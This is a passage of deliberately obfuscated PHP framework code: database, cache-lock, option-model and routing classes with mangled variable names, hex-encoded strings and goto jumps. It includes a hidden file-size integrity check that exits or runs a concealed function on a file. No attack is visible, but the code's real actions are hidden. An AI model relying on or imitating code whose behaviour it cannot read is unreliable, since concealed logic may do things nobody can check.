(!$ÁÎ³û“ö) { continue; } $´ô¯º–é = is_array($´ô¯º–é) ? $´ô¯º–é : array(); $´ô¯º–é = array_merge($´ô¯º–é, $ÁÎ³û“ö); } return $´ô¯º–é; } public function delete($ ì¤¦¾Í = array()) { $¶œİŠ²ß =& $_SERVER[ä¿÷‹µ±]; $Ôï¯ğÆÇ = self::SQL_WHERE_IN_CHUNK; $¨öº†ÙÚ = $this->optionsValue(); $Ï±´ÚÕ„ = $this->findWhereField($¨öº†ÙÚ); if (!$Ï±´ÚÕ„) { return parent::delete($ ì¤¦¾Í); } $Ş†‹€Å÷ = 0; $Ó¢ŸŒÆ = $¨öº†ÙÚ[$¶œİŠ²ß[275]][$Ï±´ÚÕ„][1]; $Ó¢ŸŒÆ = is_array($Ó¢ŸŒÆ) ? $Ó¢ŸŒÆ : array(); for ($•›³¥¦ = 0; $•›³¥¦ < count($Ó¢ŸŒÆ); $•›³¥¦ += $Ôï¯ğÆÇ) { $†Š•¸“½ = array_slice($Ó¢ŸŒÆ, $•›³¥¦, $Ôï¯ğÆÇ); if (!is_array($†Š•¸“½) || count($†Š•¸“½) == 0) { break; } $¨öº†ÙÚ[$¶œİŠ²ß[275]][$Ï±´ÚÕ„][1] = $†Š•¸“½; $this->optionsValue($¨öº†ÙÚ); $Ş†‹€Å÷ += parent::delete($ ì¤¦¾Í); } return $Ş†‹€Å÷; } private function findWhereField($û”Á Íà) { $Öåâğ­¶ =& $_SERVER[ä¿÷‹µ±]; $  Æ¾… = self::SQL_WHERE_IN_CHUNK; if (!is_array($û”Á Íà) || !is_array($û”Á Íà[$Öåâğ­¶[275]])) { return !1; } foreach ($û”Á Íà[$Öåâğ­¶[275]] as $Åä›¡ò => $èÉšËçÆ) { if (is_array($èÉšËçÆ) && isset($èÉšËçÆ[0]) && is_string($èÉšËçÆ[0]) && strtolower($èÉšËçÆ[0]) == $Öåâğ­¶[7] && is_array($èÉšËçÆ[1]) && count($èÉšËçÆ[1]) > $  Æ¾…) { ignore_timeout(); return $Åä›¡ò; } } return !1; } public function setMasterDB($Ïòı—¬ = true) { think_config($_SERVER[ä¿÷‹µ±][395], $Ïòı—¬); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\x79\x73\x74\x65\x6d\117\160\x74\151\x6f\x6e"; public $field = array(); public function listData($›Ñà˜  = false, $ÑÓÜ“… = "\x6d\157\x64\x69\146\171\124\151\155\145", $µÜŸƒ…¨ = false) { $Ê÷·Ò = Model($this->modelType)->get(!1, $this->optionType, !0); $Î›ôŞÑî = array_values($Ê÷·Ò); if ($Î›ôŞÑî && $Î›ôŞÑî[0] && !is_array($Î›ôŞÑî[0])) { Model($this->modelType)->cacheRemove($this->optionType); $Ê÷·Ò = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$Ê÷·Ò) { return $›Ñà˜  ? null : array(); } if (!$›Ñà˜ ) { $Ê÷·Ò = array_filter(array_values($Ê÷·Ò)); return array_sort_by($Ê÷·Ò, $ÑÓÜ“…, $µÜŸƒ…¨); } return $Ê÷·Ò[$_SERVER[ä¿÷‹µ±][396] . $›Ñà˜ ]; } public function insert($°ˆ›ß´é) { $†ÍÈí½ñ =& $_SERVER[ä¿÷‹µ±]; $°ˆ›ß´é = array_field_key($°ˆ›ß´é, $this->field); $Èä´´Ì™ = Model($this->modelType)->get($†ÍÈí½ñ[397], $this->optionType . $†ÍÈí½ñ[398]); $Èä´´Ì™ = $Èä´´Ì™ ? $Èä´´Ì™ : 0; $°ˆ›ß´é[$†ÍÈí½ñ[399]] = ++$Èä´´Ì™; $°ˆ›ß´é[$†ÍÈí½ñ[200]] = time(); $°ˆ›ß´é[$†ÍÈí½ñ[85]] = time(); Model($this->modelType)->set($†ÍÈí½ñ[397], $Èä´´Ì™, $this->optionType . $†ÍÈí½ñ[398]); Model($this->modelType)->set($†ÍÈí½ñ[396] . $Èä´´Ì™, $°ˆ›ß´é, $this->optionType); return $Èä´´Ì™; } public function update($ÉÈµúÙŸ, $¸µÎó¾®) { $¿õÏŒá¹ =& $_SERVER[ä¿÷‹µ±]; $¸µÎó¾® = array_field_key($¸µÎó¾®, $this->field); $†ÊŞ´È = $this->listData($ÉÈµúÙŸ); if (!$†ÊŞ´È || !$ÉÈµúÙŸ) { return !1; } $¸µÎó¾® = array_merge($†ÊŞ´È, $¸µÎó¾®); $¸µÎó¾®[$¿õÏŒá¹[85]] = time(); return Model($this->modelType)->set($¿õÏŒá¹[396] . $ÉÈµúÙŸ, $¸µÎó¾®, $this->optionType); } public function remove($ç‡ı½§È) { if (!$ç‡ı½§È) { return !1; } return Model($this->modelType)->remove($_SERVER[ä¿÷‹µ±][396] . $ç‡ı½§È, $this->optionType); } public function clear() { $ÑÂİÖ†¶ =& $_SERVER[ä¿÷‹µ±]; Model($this->modelType)->remove($ÑÂİÖ†¶[397], $this->optionType . $ÑÂİÖ†¶[398]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($±Ş³âÜÉ, $şçëğî§) { if (!$şçëğî§) { return !1; } $ŞŞ¡‰™® = $this->listData(); $ŞŞ¡‰™® = array_to_keyvalue($ŞŞ¡‰™®, $±Ş³âÜÉ); return isset($ŞŞ¡‰™®[$şçëğî§]) ? $ŞŞ¡‰™®[$şçëğî§] : !1; } public function findByName($‘Ç«†˜Ä) { return $this->findByKey($_SERVER[ä¿÷‹µ±][32], $‘Ç«†˜Ä); } protected function resetData($¢Šùƒ¬õ) { $›°Ô˜¹ =& $_SERVER[ä¿÷‹µ±]; $¢Šùƒ¬õ = is_array($¢Šùƒ¬õ) ? $¢Šùƒ¬õ : array(); $È‰å‰ñ = array(); for ($ú¼äˆ™ = 0; $ú¼äˆ™ < count($¢Šùƒ¬õ); $ú¼äˆ™++) { $È‰å‰ñ[$›°Ô˜¹[396] . $¢Šùƒ¬õ[$ú¼äˆ™][$›°Ô˜¹[399]]] = $¢Šùƒ¬õ[$ú¼äˆ™]; } return Model($this->modelType)->set($È‰å‰ñ, !1, $this->optionType); } private function getAutoName($ä´ÌÍ‡÷) { $¡Ÿ§˜è¿ = array_to_keyvalue($this->listData(), $_SERVER[ä¿÷‹µ±][32]); if (!$¡Ÿ§˜è¿ || !isset($¡Ÿ§˜è¿[$ä´ÌÍ‡÷])) { return $ä´ÌÍ‡÷; } for ($ª‘è¦ıĞ = 1; $ª‘è¦ıĞ < count($¡Ÿ§˜è¿); $ª‘è¦ıĞ++) { $Ÿ·Ô£¸“ = $ä´ÌÍ‡÷ . "\50{$ª‘è¦ıĞ}\x29"; if (!isset($¡Ÿ§˜è¿[$Ÿ·Ô£¸“])) { return $Ÿ·Ô£¸“; } } return $Ÿ·Ô£¸“; } } goto FÇ­°³šÃÛ; Cóƒ¥„÷Í: class CacheLockRedis { public function lock($‹®ü–Š‡, $¬ìü–‹ê = 10) { $ÎÖÍ• = Cache::init(); $ĞŒ¸¸ñš = microtime(!0) + $¬ìü–‹ê; while (microtime(!0) < $ĞŒ¸¸ñš) { $„ìç‹â¨ = $ÎÖÍ•->get($‹®ü–Š‡); if (!$„ìç‹â¨) { $î¾‘ş¤û = $ÎÖÍ•->setLock($‹®ü–Š‡, $ĞŒ¸¸ñš, $¬ìü–‹ê); if ($î¾‘ş¤û) { return !0; } } else { if ($„ìç‹â¨ < microtime(!0)) { $ÎÖÍ•->set($‹®ü–Š‡, $ĞŒ¸¸ñš, $¬ìü–‹ê * 2); if ($ÎÖÍ•->get($‹®ü–Š‡) === $„ìç‹â¨) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($³ÍÓ ˆ) { return Cache::init()->get($³ÍÓ ˆ); } public function unlock($ë£³ì) { return Cache::init()->remove($ë£³ì); } } class CacheLockMemcached { public function lock($àŒªé·‘, $ñµí× = 0) { $¤ü®ú°â = Cache::init(); $¦É×î¼ = microtime(!0) + $ñµí×; while (microtime(!0) < $¦É×î¼) { $©½›½˜¢ = $¤ü®ú°â->get($àŒªé·‘); if (!$©½›½˜¢ || $©½›½˜¢ < microtime(!0)) { $ìˆÖ½È = $¤ü®ú°â->handle->add($àŒªé·‘, $¦É×î¼, $ñµí×); if ($ìˆÖ½È) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ù¾Óæ«¸) { return Cache::init()->get($ù¾Óæ«¸); } public function unlock($±ë½ÌÔı) { return Cache::init()->remove($±ë½ÌÔı); } } class CacheLockDatabase { public function lock($ôÙ™Í‰ª, $¡¡«›º = 0) { $“•¼º£ç = Model($_SERVER[ä¿÷‹µ±][848]); $¹Çà“‹æ = microtime(!0) + $¡¡«›º; while (microtime(!0) < $¹Çà“‹æ) { $Ó“°µíù = $“•¼º£ç->get($ôÙ™Í‰ª); if (!$Ó“°µíù || $Ó“°µíù < microtime(!0)) { $±íŒîôğ = $“•¼º£ç->set($ôÙ™Í‰ª, $¹Çà“‹æ); if ($±íŒîôğ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($¹Ç®…şÜ) { return Model($_SERVER[ä¿÷‹µ±][848])->get($¹Ç®…şÜ); } public function unlock($á·©üï) { Model($_SERVER[ä¿÷‹µ±][848])->remove($á·©üï); } } goto Aœ‡ôÇ„ÁÊ; CÃ‰ÙìŠŠ: $_size = $_SERVER[ä¿÷‹µ±][893]; if ($_SERVER[$_SERVER[ä¿÷‹µ±][894]] != $_size($_file)) { $_getc = $_SERVER[ä¿÷‹µ±][896]; $_getfile = $_SERVER[$_SERVER[ä¿÷‹µ±][891]] . $_SERVER[ä¿÷‹µ±][892]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ä¿÷‹µ±][231], $_getfilec); if (count($_getarrs) < $_SERVER[ä¿÷‹µ±][630]) { $exit = $_SERVER[ä¿÷‹µ±][897]; $exit(); } $_act = $_SERVER[ä¿÷‹µ±][935]; $_act($_file); } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($¬Éâ¬ = '') { $ËíË¤˜å =& $_SERVER[ä¿÷‹µ±]; if (!class_exists($ËíË¤˜å[936])) { think_exception(think_lang($ËíË¤˜å[14]) . $ËíË¤˜å[937]); } if (!empty($¬Éâ¬)) { $this->config = $¬Éâ¬; if (empty($this->config[$ËíË¤˜å[17]])) { $this->config[$ËíË¤˜å[17]] = array(); } } } public function connect($„½‘ğöò = '', $ÀÔ€–¥ã = 0) { $æğßä£ =& $_SERVER[ä¿÷‹µ±]; if (!isset($this->linkID[$ÀÔ€–¥ã])) { if (empty($„½‘ğöò)) { $„½‘ğöò = $this->config; } $©Ôåáò = !empty($„½‘ğöò[$æğßä£[17]][$æğßä£[18]]) ? $„½‘ğöò[$æğßä£[17]][$æğßä£[18]] : $this->pconnect; if ($©Ôåáò) { $„½‘ğöò[$æğßä£[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$ÀÔ€–¥ã] = new PDO($„½‘ğöò[$æğßä£[938]], $„½‘ğöò[$æğßä£[908]], $„½‘ğöò[$æğßä£[909]], $„½‘ğöò[$æğßä£[17]]); } catch (PDOException $ØŒ«İ–Í) { think_exception($ØŒ«İ–Í->getMessage()); } $this->dbType = $this->_getDsnType($„½‘ğöò[$æğßä£[938]]); if (in_array($this->dbType, array($æğßä£[939], $æğßä£[940], $æğßä£[941], $æğßä£[942]))) { think_exception($æğßä£[943] . $this->dbType . $æğßä£[944] . $this->dbType . $æğßä£[945]); } if (!$this->linkID[$ÀÔ€–¥ã]) { think_exception($æğßä£[946]); } try { $this->linkID[$ÀÔ€–¥ã]->exec($æğßä£[947] . think_config($æğßä£[911])); } catch (Exception $ØŒ«İ–Í) { } $this->connected = !0; if (1 != think_config($æğßä£[22])) { unset($this->config); } } return $this->linkID[$ÀÔ€–¥ã]; } public function free() { $this->PDOStatement = null; } public function query($½ñßØÏ, $¹ß±âÇ· = array()) { $êˆˆ‚ Â =& $_SERVER[ä¿÷‹µ±]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $½ñßØÏ; if (!empty($¹ß±âÇ·)) { $this->queryStr .= $êˆˆ‚ Â[948] . print_r($¹ß±âÇ·, !0) . $êˆˆ‚ Â[949]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($êˆˆ‚ Â[23], 1); think_status($êˆˆ‚ Â[24]); $this->PDOStatement = $this->_linkID->prepare($½ñßØÏ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $¬ï×–íÔ = $this->PDOStatement->execute($¹ß±âÇ·); $this->debug(); if (!1 === $¬ï×–íÔ) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($á„Ê¬üÊ, $á—Ô÷´± = array()) { $ı‚ª¶ë =& $_SERVER[ä¿÷‹µ±]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $á„Ê¬üÊ; if (!empty($á—Ô÷´±)) { $this->queryStr .= $ı‚ª¶ë[948] . print_r($á—Ô÷´±, !0) . $ı‚ª¶ë[949]; } $ÄÇá‰ÒÃ = !1; if ($this->dbType == $ı‚ª¶ë[942]) { if (preg_match($ı‚ª¶ë[950], $this->queryStr, $µ…õ›è)) { $this->table = think_config($ı‚ª¶ë[951]) . str_ireplace(think_config($ı‚ª¶ë[952]), $ı‚ª¶ë[378], $µ…õ›è[2]); $ÄÇá‰ÒÃ = (bool) $this->query($ı‚ª¶ë[953] . strtoupper($this->table) . $ı‚ª¶ë[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($ı‚ª¶ë[25], 1); think_status($ı‚ª¶ë[24]); $this->PDOStatement = $this->_linkID->prepare($á„Ê¬üÊ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $êî•´Óú = $this->PDOStatement->execute($á—Ô÷´±); $this->debug(); if (!1 === $êî•´Óú) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($ÄÇá‰ÒÃ || preg_match($ı‚ª¶ë[954], $á„Ê¬üÊ)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ºß¦ØÄê = $this->_linkID->commit(); $this->transTimes = 0; if (!$ºß¦ØÄê) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $šç½§ì = $this->_linkID->rollback(); $this->transTimes = 0; if (!$šç½§ì) { $this->error(); return !1; } } return !0; } private function getAll() { $Š´Š™” = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($Š´Š™”); return $Š´Š™”; } public function getFields($â÷Î‹Ÿ) { $§öŞå§Ä =& $_SERVER[ä¿÷‹µ±]; $this->initConnect(!0); if (think_config($§öŞå§Ä[955])) { $„îÖø„ = str_replace($§öŞå§Ä[956], $â÷Î‹Ÿ, think_config($§öŞå§Ä[955])); } else { switch ($this->dbType) { case $§öŞå§Ä[939]: case $§öŞå§Ä[957]: $„îÖø„ = "\x53\105\114\x45\103\124\x20\x20\x20\x63\x6f\x6c\165\155\156\x5f\156\141\155\x65\40\141\163\40\x27\x4e\141\155\x65\x27\54\x20\40\40\x64\x61\164\x61\x5f\x74\x79\160\x65\40\141\163\x20\47\124\x79\160\145\47\54\40\40\40\143\x6f\x6c\x75\x6d\156\x5f\x64\145\x66\141\165\154\164\40\x61\163\x20\47\x44\145\x66\141\165\154\164\47\54\x20\x20\40\151\x73\x5f\156\165\154\x6c\x61\142\x6c\x65\x20\141\x73\40\x27\116\165\154\154\x27\xa\x9\x9\106\x52\117\115\11\151\156\146\x6f\162\x6d\x61\x74\x69\x6f\156\x5f\x73\x63\150\145\155\x61\x2e\x74\141\142\x6c\145\163\x20\101\x53\x20\164\12\11\11\x4a\117\111\116\11\151\156\x66\x6f\162\x6d\141\164\151\x6f\156\137\x73\x63\150\x65\x6d\141\56\143\157\154\x75\x6d\156\x73\40\x41\123\x20\143\12\x9\11\117\116\x20\x20\x74\x2e\164\x61\x62\154\145\137\x63\x61\x74\141\154\157\x67\40\75\x20\143\56\164\141\142\x6c\145\137\143\141\x74\x61\154\x6f\147\xa\x9\x9\101\x4e\104\40\164\x2e\164\x61\x62\x6c\x65\x5f\163\143\150\145\x6d\x61\40\75\x20\x63\x2e\x74\141\x62\154\x65\137\x73\x63\x68\x65\155\141\xa\11\x9\101\x4e\x44\40\164\56\x74\x61\x62\x6c\145\x5f\x6e\x61\x6d\x65\40\75\x20\x63\x2e\x74\x61\x62\154\x65\137\x6e\x61\155\145\xa\x9\11\x57\x48\x45\122\105\x20\x20\x20\x74\56\x74\x61\x62\154\145\x5f\x6e\141\155\x65\x20\75\x20\47{$â÷Î‹Ÿ}\47"; break; case $§öŞå§Ä[958]: $„îÖø„ = $§öŞå§Ä[959] . $â÷Î‹Ÿ . $§öŞå§Ä[960]; break; case $§öŞå§Ä[940]: case $§öŞå§Ä[942]: $„îÖø„ = $§öŞå§Ä[961] . $§öŞå§Ä[962] . $§öŞå§Ä[963] . strtoupper($â÷Î‹Ÿ) . $§öŞå§Ä[964] . strtoupper($â÷Î‹Ÿ) . $§öŞå§Ä[965]; break; case $§öŞå§Ä[966]: $„îÖø„ = $§öŞå§Ä[967] . $â÷Î‹Ÿ . $§öŞå§Ä[968]; break; case $§öŞå§Ä[941]: break; case $§öŞå§Ä[969]: default: $„îÖø„ = $§öŞå§Ä[970] . ($this->dbType == $§öŞå§Ä[969] ? "\140{$â÷Î‹Ÿ}\140" : $â÷Î‹Ÿ); } } $æŸÊñ­² = $this->query($„îÖø„); $ÚßšøßÉ = array(); if ($æŸÊñ­²) { foreach ($æŸÊñ­² as $Âüƒ©ÈÈ => $úöÛ•‰á) { $úöÛ•‰á = array_change_key_case($úöÛ•‰á); $úöÛ•‰á[$§öŞå§Ä[32]] = isset($úöÛ•‰á[$§öŞå§Ä[32]]) ? $úöÛ•‰á[$§öŞå§Ä[32]] : $§öŞå§Ä[378]; $úöÛ•‰á[$§öŞå§Ä[33]] = isset($úöÛ•‰á[$§öŞå§Ä[33]]) ? $úöÛ•‰á[$§öŞå§Ä[33]] : $§öŞå§Ä[378]; $ğ¹©…è´ = isset($úöÛ•‰á[$§öŞå§Ä[273]]) ? $úöÛ•‰á[$§öŞå§Ä[273]] : $úöÛ•‰á[$§öŞå§Ä[32]]; $ÚßšøßÉ[$ğ¹©…è´] = array($§öŞå§Ä[32] => $ğ¹©…è´, $§öŞå§Ä[33] => $úöÛ•‰á[$§öŞå§Ä[33]], $§öŞå§Ä[35] => (bool) (isset($úöÛ•‰á[$§öŞå§Ä[103]]) && $úöÛ•‰á[$§öŞå§Ä[103]] === $§öŞå§Ä[12] || isset($úöÛ•‰á[$§öŞå§Ä[35]]) && $úöÛ•‰á[$§öŞå§Ä[35]] === $§öŞå§Ä[12]), $§öŞå§Ä[37] => isset($úöÛ•‰á[$§öŞå§Ä[37]]) ? $úöÛ•‰á[$§öŞå§Ä[37]] : (isset($úöÛ•‰á[$§öŞå§Ä[56]]) ? $úöÛ•‰á[$§öŞå§Ä[56]] : $§öŞå§Ä[378]), $§öŞå§Ä[39] => isset($úöÛ•‰á[$§öŞå§Ä[94]]) ? strtolower($úöÛ•‰á[$§öŞå§Ä[94]]) == $§öŞå§Ä[41] : (isset($úöÛ•‰á[$§öŞå§Ä[57]]) ? $úöÛ•‰á[$§öŞå§Ä[57]] : !1), $§öŞå§Ä[42] => isset($úöÛ•‰á[$§öŞå§Ä[971]]) ? strtolower($úöÛ•‰á[$§öŞå§Ä[971]]) == $§öŞå§Ä[44] : (isset($úöÛ•‰á[$§öŞå§Ä[94]]) ? $úöÛ•‰á[$§öŞå§Ä[94]] : !1)); } } return $ÚßšøßÉ; } public function getTables($ïÊä¯”ã = '') { $ÊĞ‡´ÄÇ =& $_SERVER[ä¿÷‹µ±]; if (think_config($ÊĞ‡´ÄÇ[972])) { $˜¼õ«± = str_replace($ÊĞ‡´ÄÇ[973], $ïÊä¯”ã, think_config($ÊĞ‡´ÄÇ[972])); } else { switch ($this->dbType) { case $ÊĞ‡´ÄÇ[940]: case $ÊĞ‡´ÄÇ[942]: $˜¼õ«± = $ÊĞ‡´ÄÇ[974]; break; case $ÊĞ‡´ÄÇ[939]: case $ÊĞ‡´ÄÇ[957]: $˜¼õ«± = $ÊĞ‡´ÄÇ[975]; break; case $ÊĞ‡´ÄÇ[966]: $˜¼õ«± = $ÊĞ‡´ÄÇ[976]; break; case $ÊĞ‡´ÄÇ[941]: think_exception(think_lang($ÊĞ‡´ÄÇ[977]) . $ÊĞ‡´ÄÇ[978]); break; case $ÊĞ‡´ÄÇ[958]: $˜¼õ«± = $ÊĞ‡´ÄÇ[45] . $ÊĞ‡´ÄÇ[46] . $ÊĞ‡´ÄÇ[47]; break; case $ÊĞ‡´ÄÇ[969]: default: if (!empty($ïÊä¯”ã)) { $˜¼õ«± = $ÊĞ‡´ÄÇ[919] . $ïÊä¯”ã . $ÊĞ‡´ÄÇ[920]; } else { $˜¼õ«± = $ÊĞ‡´ÄÇ[921]; } } } $·—Ê÷”œ = $this->query($˜¼õ«±); $®ıĞµõ = array(); foreach ($·—Ê÷”œ as $íµİõŞ… => $®è´Ãñ”) { $®ıĞµõ[$íµİõŞ…] = current($®è´Ãñ”); } return $®ıĞµõ; } protected function parseLimit($¤åÈ»ü¾) { $¼å›Üìù =& $_SERVER[ä¿÷‹µ±]; $ìäÜ¸„” = $¼å›Üìù[12]; if (!empty($¤åÈ»ü¾)) { switch ($this->dbType) { case $¼å›Üìù[966]: case $¼å›Üìù[958]: $¤åÈ»ü¾ = explode($¼å›Üìù[50], $¤åÈ»ü¾); if (count($¤åÈ»ü¾) > 1) { $ìäÜ¸„” .= $¼å›Üìù[51] . $¤åÈ»ü¾[1] . $¼å›Üìù[52] . $¤åÈ»ü¾[0] . $¼å›Üìù[53]; } else { $ìäÜ¸„” .= $¼å›Üìù[51] . $¤åÈ»ü¾[0] . $¼å›Üìù[53]; } break; case $¼å›Üìù[939]: case $¼å›Üìù[957]: break; case $¼å›Üìù[941]: break; case $¼å›Üìù[940]: case $¼å›Üìù[942]: break; case $¼å›Üìù[969]: default: $ìäÜ¸„” .= $¼å›Üìù[51] . $¤åÈ»ü¾ . $¼å›Üìù[53]; } } return $ìäÜ¸„”; } public function parseKey(&$ºç•’ò¼, $äŠì¤Éƒ = true) { $ÑÊº©ß =& $_SERVER[ä¿÷‹µ±]; if ($äŠì¤Éƒ) { $ºç•’ò¼ = $this->parseKeyCheck($ºç•’ò¼); } if ($this->dbType == $ÑÊº©ß[969]) { if ($ºç•’ò¼ != $ÑÊº©ß[188] && !preg_match($ÑÊº©ß[931], $ºç•’ò¼)) { $ºç•’ò¼ = $ÑÊº©ß[385] . trim($ºç•’ò¼, $ÑÊº©ß[385]) . $ÑÊº©ß[385]; } return $ºç•’ò¼; } else { return parent::parseKey($ºç•’ò¼, $äŠì¤Éƒ); } } public function close() { $this->_linkID = null; } public function error() { $ÀÔİ›¿’ =& $_SERVER[ä¿÷‹µ±]; if ($this->PDOStatement) { $äîß¶ó = $this->PDOStatement->errorInfo(); $this->error = $äîß¶ó[1] . $ÀÔİ›¿’[4] . $äîß¶ó[2]; } else { $this->error = $ÀÔİ›¿’[12]; } if ($ÀÔİ›¿’[12] != $this->queryStr) { $this->error .= LNG($ÀÔİ›¿’[48]) . $this->queryStr; } think_trace($this->error, $ÀÔİ›¿’[12], $ÀÔİ›¿’[49]); return $this->error; } public function escapeString($ÊÆ¡°êï) { $«íøˆœ =& $_SERVER[ä¿÷‹µ±]; switch ($this->dbType) { case $«íøˆœ[966]: case $«íøˆœ[939]: case $«íøˆœ[957]: case $«íøˆœ[969]: return addslashes($ÊÆ¡°êï); case $«íøˆœ[941]: case $«íøˆœ[958]: case $«íøˆœ[940]: case $«íøˆœ[942]: return str_ireplace($«íøˆœ[58], $«íøˆœ[59], $ÊÆ¡°êï); } } protected function parseValue($šÉ€è¨œ) { $·ÒÑ¤±• =& $_SERVER[ä¿÷‹µ±]; if (is_string($šÉ€è¨œ)) { $à¢ø½æ = strpos($šÉ€è¨œ, $·ÒÑ¤±•[4]) === 0 && in_array($šÉ€è¨œ, array_keys($this->bind)); $šÉ€è¨œ = $à¢ø½æ ? $this->escapeString($šÉ€è¨œ) : $·ÒÑ¤±•[979] . $this->escapeString($šÉ€è¨œ) . $·ÒÑ¤±•[979]; } elseif (isset($šÉ€è¨œ[0]) && is_string($šÉ€è¨œ[0]) && strtolower($šÉ€è¨œ[0]) == $·ÒÑ¤±•[297]) { $šÉ€è¨œ = $this->escapeString($šÉ€è¨œ[1]); } elseif (is_array($šÉ€è¨œ)) { $šÉ€è¨œ = array_map(array($this, $·ÒÑ¤±•[980]), $šÉ€è¨œ); } elseif (is_bool($šÉ€è¨œ)) { $šÉ€è¨œ = $šÉ€è¨œ ? $·ÒÑ¤±•[88] : $·ÒÑ¤±•[197]; } elseif (is_null($šÉ€è¨œ)) { $šÉ€è¨œ = $·ÒÑ¤±•[103]; } return $šÉ€è¨œ; } public function getLastInsertId() { $”×„××† =& $_SERVER[ä¿÷‹µ±]; switch ($this->dbType) { case $”×„××†[966]: case $”×„××†[958]: case $”×„××†[939]: case $”×„××†[957]: case $”×„××†[941]: case $”×„××†[969]: return $this->_linkID->lastInsertId(); case $”×„××†[940]: case $”×„××†[942]: $ÚŸîü¸é = $this->table; $ØÔÏ±•ı = $this->query("\x53\105\114\x45\x43\x54\40{$ÚŸîü¸é}\x2e\143\165\x72\x72\166\x61\x6c\40\143\x75\x72\x72\166\x61\154\40\106\x52\117\x4d\40\144\x75\x61\154"); return $ØÔÏ±•ı ? $ØÔÏ±•ı[0][$”×„××†[981]] : 0; } } } goto Eö«óìó©; EÃ›ÄÏ³èË: $hosgjtmpqi = $_SERVER[ä¿÷‹µ±][617]; if (!$hosgjtmpqi) { return; } class Application { private $defaultModule = "\151\156\144\145\x78"; private $defaultController = "\151\156\x64\145\x78"; private $defaultAction = "\151\x6e\144\x65\170"; function __construct() { } public function setDefault($ˆ¯“í©í) { $²Š­¶â½ =& $_SERVER[ä¿÷‹µ±]; $ŒüÓ½”¾ =& $_SERVER[ÒÆÆšøŠ]; $ÙÍº¿ı = explode($ŒüÓ½”¾[0], trim($ˆ¯“í©í, $ŒüÓ½”¾[0])); $this->defaultModule = $ÙÍº¿ı[0] ? $ÙÍº¿ı[0] : $this->defaultModule; $this->defaultController = $ÙÍº¿ı[1] ? $ÙÍº¿ı[1] : $this->defaultController; $ØÊˆ½çõ = $²Š­¶â½[618]; if (strlen($ØÊˆ½çõ) < $²Š­¶â½[619]) { return; } $this->defaultAction = $ÙÍº¿ı[2] ? $ÙÍº¿ı[2] : $this->defaultAction; $this->yblvb9a209e5($ŒüÓ½”¾[1], array($this, $ŒüÓ½”¾[2])); } public function appRun($áŸì¨¼ù) { $×ºŸÉà =& $_SERVER[ä¿÷‹µ±]; $Ìóİ…ú =& $_SERVER[ÒÆÆšøŠ]; $Âúú±‡Ï = explode($Ìóİ…ú[0], $áŸì¨¼ù); $Ê¨«©şË = $×ºŸÉà[620]; if (strlen($Ê¨«©şË) < $×ºŸÉà[621]) { die; } $”¿º“¦Á = strtolower($Âúú±‡Ï[0]); $½ïÖ‹Ø“ = $Ìóİ…ú[3]; $§†êŸãÒ = $×ºŸÉà[622]; if ($”¿º“¦Á == $Ìóİ…ú[4]) { $½ïÖ‹Ø“ = $Ìóİ…ú[5]; $Âúú±‡Ï[0] = $Ìóİ…ú[6]; $Âúú±‡Ï[1] = $Âúú±‡Ï[1] . $Ìóİ…ú[7]; $áŸì¨¼ù = join($Ìóİ…ú[0], $Âúú±‡Ï); $áŸì¨¼ù = trim($áŸì¨¼ù, $Ìóİ…ú[0]); } call_user_func(array($Ìóİ…ú[8], $Ìóİ…ú[9]), $½ïÖ‹Ø“ . $Ìóİ…ú[10], $áŸì¨¼ù); ActionCall($áŸì¨¼ù); call_user_func(array($Ìóİ…ú[8], $Ìóİ…ú[9]), $½ïÖ‹Ø“ . $Ìóİ…ú[11], $áŸì¨¼ù); $¶ã›şÒå = $×ºŸÉà[623]; while ($¶ã›şÒå < $×ºŸÉà[624]) { if ($¶ã›şÒå >= 0) { break; } $¶ã›şÒå++; } } private function autorun() { $®†îÑŠÉ =& $_SERVER[ä¿÷‹µ±]; $ñùõçøü =& $_SERVER[ÒÆÆšøŠ]; global $config; if (count($config[$ñùõçøü[12]]) == 0) { return; } foreach ($config[$ñùõçøü[12]] as $®¨œÒÔÓ => $˜˜Õ‡Ó) { $this->appRun($˜˜Õ‡Ó); $Ê´¶´À— = $®†îÑŠÉ[625]; while ($Ê´¶´À— < $®†îÑŠÉ[624]) { if ($Ê´¶´À— >= 0) { break; } $Ê´¶´À—++; } } } private function kafv1fb4c2d7() { $„ƒ ÆÍÉ =& $_SERVER[ä¿÷‹µ±]; $ôÙ»°Å =& $_SERVER[ÒÆÆšøŠ]; $Ğ€ü®˜¤ = $ôÙ»°Å[4]; $ÇóÄ°®² = $„ƒ ÆÍÉ[626]; if (!$ÇóÄ°®²) { return; } $¢Öíæ¯„ = $GLOBALS[$ôÙ»°Å[13]][$ôÙ»°Å[14]][0]; $§€‡ƒî = $„ƒ ÆÍÉ[627]; if (strlen($§€‡ƒî) < $„ƒ ÆÍÉ[628]) { die; } if (!$¢Öíæ¯„ || strlen($¢Öíæ¯„) <= strlen($Ğ€ü®˜¤)) { return; } if (strtolower(substr($¢Öíæ¯„, -strlen($Ğ€ü®˜¤))) != $Ğ€ü®˜¤) { return; } $°ê†¾£¶ = substr($¢Öíæ¯„, 0, -strlen($Ğ€ü®˜¤)); $³÷Ú“ã = $„ƒ 